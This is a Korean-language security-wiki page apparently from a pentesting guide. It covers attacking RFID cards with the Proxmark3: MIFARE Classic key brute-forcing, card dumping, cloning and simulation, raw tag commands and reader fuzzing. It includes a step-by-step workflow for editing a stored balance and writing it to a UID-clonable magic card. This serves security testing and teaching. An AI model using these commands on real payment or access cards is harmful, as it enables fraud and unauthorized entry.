# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3를 사용한 RFID 시스템 공격

활발히 유지 관리되는 RRG/Iceman Proxmark3 client와 이에 맞는 firmware를 설치한 다음, 이전에 표시된 명령이 변경되었을 수 있으므로 해당 build에서 명령어 syntax를 확인합니다.<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB 공격

MIFARE Classic 1K에는 **16개 sector**가 있으며, 각 sector는 **16바이트 크기의 4개 block**으로 구성됩니다. Manufacturer block 0에는 UID/manufacturer data가 포함되며, 정품 NXP card에서는 read-only입니다. 특수 clone 또는 “magic” card에서는 이 block을 다시 작성할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>\
각 sector에 액세스하려면 **2개의 key**(**A** 및 **B**)가 필요하며, 이 key는 각 sector의 **block 3**(sector trailer)에 저장됩니다. sector trailer에는 2개의 key를 사용해 **각 block에 대한 read 및 write** 권한을 부여하는 **access bits**도 저장됩니다.\
예를 들어, 첫 번째 key를 알고 있으면 read 권한을 부여하고 두 번째 key를 알고 있으면 write 권한을 부여하는 데 2개의 key가 유용합니다.

여러 공격을 수행할 수 있습니다.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3를 사용하면 **Tag to Reader communication**을 **eavesdropping**하여 민감한 데이터를 찾는 등 다른 작업도 수행할 수 있습니다. 이 카드에서는 **cryptographic operations used are weak**하므로 통신을 간단히 sniff하고 사용된 키를 계산할 수 있습니다. 평문과 암호문을 알고 있으면 키를 계산할 수 있습니다(`mfkey64` tool).<sup>[[3]](#references)</sup>

#### 저장된 값 악용을 위한 MiFare Classic quick workflow

터미널이 Classic 카드에 잔액을 저장하는 경우 일반적인 end-to-end flow는 다음과 같습니다.<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
메모

- `hf mf autopwn`은 nested/darkside/HardNested-style attacks를 조율하고, key를 복구하며, client dumps 폴더에 dump를 생성합니다.<sup>[[1]](#references)</sup>
- block 0/UID 쓰기는 magic gen1a/gen2 cards에서만 작동합니다. 일반 Classic cards의 UID는 read-only입니다.<sup>[[2]](#references)</sup>
- 많은 deployment에서는 Classic "value blocks" 또는 간단한 checksums를 사용합니다. 편집 후 모든 duplicated/complemented fields와 checksums가 일관적인지 확인해야 합니다.<sup>[[4]](#references)</sup>

상위 수준의 methodology와 mitigations는 다음을 참조하세요:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT 시스템은 때때로 **nonbranded 또는 noncommercial tags**를 사용합니다. 이 경우 Proxmark3를 사용하여 **tags에 custom raw commands**를 전송할 수 있습니다.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
이 정보를 사용하면 카드와 카드와 통신하는 방법에 대한 정보를 검색해 볼 수 있습니다. Proxmark3를 사용하면 다음과 같이 raw commands를 전송할 수 있습니다: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software에는 간단한 작업을 수행하는 데 사용할 수 있는 **automation scripts** 목록이 미리 로드되어 있습니다. 전체 목록을 확인하려면 `script list` command를 사용하세요. 그런 다음 script 이름을 입력하고 `script run` command를 사용하세요:
```
proxmark3> script run mfkeys
```
**tag readers를 fuzz**하는 script를 만들 수 있습니다. **valid card**의 데이터를 복사한 다음, 하나 이상의 무작위 **bytes**를 **randomize**하고 각 반복에서 **reader가 crash하는지** 확인하는 **Lua script**를 작성하면 됩니다.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1에 대한 NXP의 입장](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value의 NFC card vulnerability exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
